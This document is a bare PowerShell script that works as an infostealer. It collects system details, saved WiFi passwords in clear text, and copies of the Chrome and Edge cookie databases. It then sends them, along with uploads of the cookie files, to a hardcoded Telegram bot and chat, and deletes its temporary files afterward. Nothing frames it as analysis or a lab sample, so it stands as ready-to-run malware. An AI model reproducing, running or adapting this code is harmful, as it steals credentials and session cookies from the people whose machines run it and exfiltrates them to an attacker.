# System Information
$computerInfo = Get-CimInstance Win32_ComputerSystem
$osInfo = Get-CimInstance Win32_OperatingSystem
$processor = Get-CimInstance Win32_Processor
$memory = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum/1GB, 2)
$gpu = (Get-CimInstance Win32_VideoController | Where-Object {$_.Name -notlike "*Remote*"} | Select-Object -First 1).Name
$disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"

# Network Information
try {
    $publicIP = (Invoke-RestMethod -Uri "http://ipinfo.io/ip" -TimeoutSec 3).Trim()
} catch {
    $publicIP = "Unable to retrieve"
}

$networkAdapters = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object InterfaceAlias, IPAddress

# WiFi Passwords
$wifiInfo = ""
try {
    $profiles = netsh wlan show profiles | Select-String "All User Profile"
    foreach ($profile in $profiles) {
        $profileName = $profile.ToString().Split(":")[1].Trim()
        try {
            $password = (netsh wlan show profile name="$profileName" key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim()
            $wifiInfo += "$profileName : $password`n"
        } catch {
            $wifiInfo += "$profileName : No password`n"
        }
    }
    if (!$wifiInfo) { $wifiInfo = "No WiFi networks found" }
} catch {
    $wifiInfo = "Error getting WiFi data"
}

# Browser Cookies
$cookiesFiles = @()
$tempDir = "$env:TEMP\Cookies_$(Get-Date -Format 'HHmmss')"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

$browsers = @(
    @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"},
    @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"}
)

foreach ($browser in $browsers) {
    if (Test-Path $browser.Path) {
        $dest = "$tempDir\$($browser.Name)_Cookies"
        Copy-Item $browser.Path $dest -ErrorAction SilentlyContinue
        if (Test-Path $dest) {
            $cookiesFiles += $dest
        }
    }
}

# System Uptime
$uptime = (Get-Date) - $osInfo.LastBootUpTime
$uptimeInfo = "$([math]::Floor($uptime.TotalHours)):$($uptime.Minutes.ToString('00'))"

# Create Message
$message = @"
=== SYSTEM INFORMATION ===
User: $env:USERNAME
Computer: $env:COMPUTERNAME
IP: $publicIP

=== HARDWARE ===
Processor: $($processor.Name)
RAM: $memory GB
GPU: $gpu
Disk C: Free: $([math]::Round($disk.FreeSpace/1GB, 1)) GB

=== WIFI PASSWORDS ===
$wifiInfo

=== BROWSER COOKIES ===
Found: $($cookiesFiles.Count) files

=== UPTIME ===
$uptimeInfo
"@

# Send to Telegram
Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{
    chat_id = '5674514050'
    text = $message
}

# Send Cookies Files
foreach ($file in $cookiesFiles) {
    if (Test-Path $file) {
        try {
            Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
                chat_id = '5674514050'
                document = [System.IO.File]::OpenRead($file)
                caption = "Cookies: $(Split-Path $file -Leaf)"
            }
        } catch {
            # Ignore send errors
        }
    }
}

# Cleanup
Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
